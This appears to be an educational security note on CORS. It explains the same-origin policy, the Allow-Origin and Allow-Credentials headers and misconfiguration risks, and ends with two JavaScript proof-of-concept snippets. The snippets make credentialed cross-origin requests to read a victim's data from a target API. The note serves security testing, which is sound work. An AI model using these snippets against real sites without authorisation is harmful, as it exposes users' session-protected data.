## Cross-Origin Resource Sharing (CORS) – Overview

**Cross-Origin Resource Sharing (CORS)** is a security mechanism implemented by browsers to control how web applications from one origin can interact with resources on a different origin using specific HTTP headers.

---

### Same-Origin Policy (SOP)

The **Same-Origin Policy (SOP)** is a fundamental security concept in browsers that restricts how documents or scripts loaded from one origin can interact with resources from another origin.

* SOP **prevents reading** between different origins, not writing.
* An **origin** is defined by the combination of:

  * **Scheme** (protocol, e.g., `http`, `https`)
  * **Hostname** (e.g., `example.com`)
  * **Port** (e.g., `:8080`)


 ![image](https://github.com/user-attachments/assets/ff7455cc-1eaa-4c14-a6e3-a9529610606f)


![image](https://github.com/user-attachments/assets/9362be74-251b-4d0b-be3b-16ed1996ebcc)


![image](https://github.com/user-attachments/assets/9cca44e8-c5eb-4b4d-b04d-847990f3c9c3)

---

### Key CORS Headers

#### Access-Control-Allow-Origin

This header specifies which origins are permitted to access the resource.

* **Specific origin**: For example, `https://example.com`
* **Wildcard (`*`)**: Allows all origins, but cannot be used when credentials are involved.
* **`null`**: A special value representing requests originating from:

  * Sandboxed documents (e.g., `<iframe sandbox>`)
  * Files loaded via the `file://` scheme
  * Some browser extensions or data URLs

> Misconfigured servers that trust `null` as an origin may become vulnerable to attacks originating from these restricted contexts.


  ![image](https://github.com/user-attachments/assets/44759b14-83ef-4ae9-be14-6fd14c52f0c5)

   
   ![image](https://github.com/user-attachments/assets/4d621179-0efb-42ad-91fd-f7e400848d25)



#### Access-Control-Allow-Credentials

This header indicates whether the response to the request can be exposed when the request’s credentials mode is `include`.

* Accepts the value `true` or `false`.
* If set to `true`, the `Access-Control-Allow-Origin` header **must specify an explicit origin**, not a wildcard (`*`).

![image](https://github.com/user-attachments/assets/9f85f383-5576-4cd8-b6a7-bc8353915252)

> ⚠️ **Important:** `Access-Control-Allow-Origin: *` **cannot be used with** `Access-Control-Allow-Credentials: true` — browsers will block it.

![image](https://github.com/user-attachments/assets/1c2ee5db-60b9-406f-abab-b78d310b7a32)

---

### CORS Misconfiguration Risks

Misconfigurations in CORS can lead to serious security issues such as:

* **Unauthorized Data Access**: Sensitive data exposed to malicious third-party websites.
* **Credential Theft**: Access to protected endpoints using victim session cookies.
* **Cross-Site Scripting (XSS)**: When combined with reflection or parsing issues.
* **Exploitation via `null` origin**: If a server incorrectly trusts `null`, it may be exploitable from local or sandboxed environments.

---

## JavaScript Templates to Test for CORS Vulnerabilities

These templates can be used in a browser console to test whether a cross-origin endpoint is accessible and leaks sensitive information.

### Method 1

```javascript
var req = new XMLHttpRequest();
req.onload = function () {
    alert(this.responseText);
};
req.open('GET', 'https://target-site.com/endpoint', true);
req.withCredentials = true;
req.send(null);
```

### Method 2

```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
        alert(xhr.responseText);
    }
};
xhr.open('GET', 'http://targetapp/api/v1/user', true);
xhr.withCredentials = true;
xhr.send(null);
```

> These scripts attempt to retrieve sensitive information from the target site using the victim’s authenticated session.

---

## References

* [Exploiting CORS Misconfigurations for Bitcoins and Bounties – by James Kettle (PortSwigger)](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

---


